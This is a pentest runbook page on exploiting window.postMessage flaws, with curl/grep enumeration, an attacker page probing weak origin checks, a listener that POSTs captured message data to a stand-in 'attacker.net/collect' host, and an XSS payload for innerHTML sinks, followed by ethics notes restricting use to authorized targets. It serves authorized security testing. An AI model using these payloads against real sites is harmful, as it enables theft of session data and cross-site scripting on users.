---
title: "PostMessage Vulnerabilities"
description: "Exploiting weak origin checks and wildcard targets in window.postMessage to steal data or escalate to cross-site scripting."
phase: Web
order: 62
tags:
  - postmessage
  - dom
  - xss
  - client-side
tools:
  - burp suite
  - browser devtools
updated: 2026-10-01
---

A postMessage runbook for bug bounty / authorized pentest on **in-scope** targets only. Goal: find a handler that trusts the wrong origin or sends to `*`, then prove you can read secrets or reach an XSS sink from an attacker-controlled page.

## 1. Enumerate handlers and senders

```bash
curl -s "https://target.com/" | grep -oE 'src="[^"]+\.js"' | cut -d'"' -f2 \
  | while read -r js; do
      curl -s "https://target.com/$js" \
        | grep -nE 'addEventListener\(.message|postMessage\('
    done
```

In DevTools, log all messages:

```js
addEventListener("message", e => console.log("msg:", e.origin, e.data, e.source));
```

## 2. Test origin validation

```html
<!-- attacker.html: iterate origins a weak check might accept -->
<script>
  const w = window.open("https://target.com/widget");
  const origins = ["https://target.com.evil.net",
                   "https://evil-target.com", "https://not.target.com", "null"];
  setTimeout(() => origins.forEach(o => w.postMessage({cmd:"ping"}, o)), 1500);
</script>
```

Weak checks in source: `.includes("target.com")`, `.startsWith("target.com")`, `/target\.com/`, or no check.

## 3. Wildcard targetOrigin

```bash
curl -s "https://target.com/app.js" | grep -nE 'postMessage\([^,]+,\s*["'\'']\*'
```

If a page sends tokens, PII, or session data to `*`, any embedding origin receives it.

## 4. Capture cross-origin replies

```html
<script>
  addEventListener("message", e => {
    fetch("https://attacker.net/collect", {method:"POST", body: JSON.stringify(e.data)});
  });
  window.open("https://target.com/dashboard");
</script>
```

```bash
python3 -m http.server 8000
```

## 5. Push data into a sink

```js
// If handler does out.innerHTML = JSON.parse(e.data).html
w.postMessage('{"html":"<img src=x onerror=alert(document.domain)>"}', "*");
```

Also check `eval(e.data)`, `location = e.data`, `document.write(e.data)`, and `MessagePort` adoption (`e.ports[0]`).

## Full pipeline

```bash
# 1. Find scripts and messaging calls
curl -s "https://target.com/" | grep -oE 'src="[^"]+\.js"' | cut -d'"' -f2 \
  | while read -r js; do
      curl -s "https://target.com/$js" | grep -nE 'addEventListener\(.message|postMessage\('
    done

# 2. Grep for wildcard targetOrigin
curl -s "https://target.com/app.js" | grep -nE 'postMessage\([^,]+,\s*["'\'']\*'

# 3. Start a collector for exfil proof
python3 -m http.server 8000
```

```html
<script>
addEventListener("message", e => console.log("leak:", e.origin, e.data));
const w = window.open("https://target.com/widget");
setTimeout(() => w.postMessage({cmd:"ping"}, "*"), 1500);
</script>
```

## Ethics & legality

- Only test origins you control against the in-scope target; never embed a third party.
- Do not exfiltrate real user data — prove access with your own session and a benign canary.
- Keep PoCs on a local or authorized host, not on public infrastructure.
- Report the exact origin-check bug with a minimal reproduction.
